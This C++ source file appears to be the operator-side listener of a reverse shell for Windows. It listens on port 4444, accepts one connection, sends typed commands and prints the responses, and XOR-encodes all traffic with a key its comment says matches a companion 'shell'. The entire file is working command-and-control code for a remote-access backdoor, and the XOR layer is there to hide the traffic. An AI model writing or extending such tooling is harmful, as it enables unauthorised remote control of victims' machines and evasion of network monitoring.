// Listener for Windows

#include <winsock2.h>
#include <ws2tcpip.h>
#include <iostream>
#include <string>
#include <thread>
#include <atomic>
#pragma comment(lib, "ws2_32.lib")

const char XOR_KEY = 0x5A; // same as shell
std::atomic<bool> running{ true };

std::string xor_decrypt(const std::string& data) 
{
    std::string result = data;
    for (char& c : result) c ^= XOR_KEY;
    return result;
}

std::string xor_encrypt(const std::string& data) 
{
    return xor_decrypt(data); // same logic
}

void receive_loop(SOCKET client_socket) 
{
    char buffer[4096];
    while (running) 
    {
        memset(buffer, 0, sizeof(buffer));
        int bytes_received = recv(client_socket, buffer, sizeof(buffer), 0);
        if (bytes_received <= 0) 
        {
            std::cout << "\n[Disconnected]\n";
            running = false;
            break;
        }

        std::string decrypted = xor_decrypt(std::string(buffer, bytes_received));
        std::cout << decrypted;
        std::cout.flush();
    }
}

int main() 
{
    WSADATA wsa;
    SOCKET server_socket, client_socket;
    struct sockaddr_in server, client;

    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
        return 1;

    server_socket = socket(AF_INET, SOCK_STREAM, 0);

    server.sin_family = AF_INET;
    server.sin_addr.s_addr = INADDR_ANY;
    server.sin_port = htons(4444);

    bind(server_socket, (struct sockaddr*)&server, sizeof(server));
    listen(server_socket, 1);
    std::cout << "[+] Listening on port 4444...\n";

    int client_len = sizeof(client);
    client_socket = accept(server_socket, (struct sockaddr*)&client, &client_len);

    if (client_socket == INVALID_SOCKET)
    {
        std::cerr << "[-] accept() failed: " << WSAGetLastError() << "\n";
        closesocket(server_socket);
        WSACleanup();
        return 1;
    }

    std::cout << "[+] Connection established.\n";

    std::thread recv_thread(receive_loop, client_socket);

    while (running) 
    {
        std::string cmd;
        if (!std::getline(std::cin, cmd)) 
        {
            running = false;
            break;
        }

        if (!running || cmd == "exit" || cmd == "quit") 
        {
            running = false;
            shutdown(client_socket, SD_BOTH);
            break;
        }

        cmd += "\n";
        std::string encrypted = xor_encrypt(cmd);
        if (send(client_socket, encrypted.c_str(), encrypted.size(), 0) <= 0) 
        {
            std::cout << "[Send error - assuming connection lost]\n";
            running = false;
            break;
        }
    }

    shutdown(client_socket, SD_BOTH);
    recv_thread.join();
    closesocket(client_socket);
    closesocket(server_socket);
    WSACleanup();
    std::cout << "[+] Listener closed.\n";
    return 0;
}
